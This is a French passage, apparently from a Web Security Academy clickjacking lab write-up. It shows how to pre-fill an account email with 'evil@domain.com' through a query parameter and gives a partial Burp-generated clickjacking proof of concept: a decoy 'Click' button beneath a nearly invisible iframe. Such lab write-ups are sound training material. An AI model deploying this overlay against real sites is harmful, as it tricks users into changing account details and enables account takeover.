...
Pour pré-remplir le formulaire on essaie d'injecter l'email avec un query param : `https://0ae9004904c9189984745fc100330043.web-security-academy.net/my-account?email=evil@domain.com`

Ca fonctionne donc on peux générer un PoC Clickbait avec Burp :

```html
<div id="container" style="clip-path: inset(200px 332px 232px 200px); clip: rect(200px, 332px, 232px, 200px); overflow: hidden; position: absolute; left: 0px; top: 0px; width: 100%; height: 100%;">
...
<div id="clickjack_button" style="opacity: 1; transform-style: preserve-3d; text-align: center; font-family: Arial; font-size: 100%; width: 132px; height: 32px; z-index: 0; background-color: red; color: rgb(255, 255, 255); position: absolute; left: 200px; top: 200px;"><div style="position:relative;top: 50%;transform: translateY(-50%);">Click</div></div>
...
<iframe id="parentFrame" src="data:text/html;base64," frameborder="0" scrolling="no" style="transform: scale(1); transform-origin: 200px 200px; opacity: 0.0001; border: 0px; position: absolute; z-index: 1; width: 1903px; height: 630px; left: 0px; top: 0px;"></iframe>
</div>
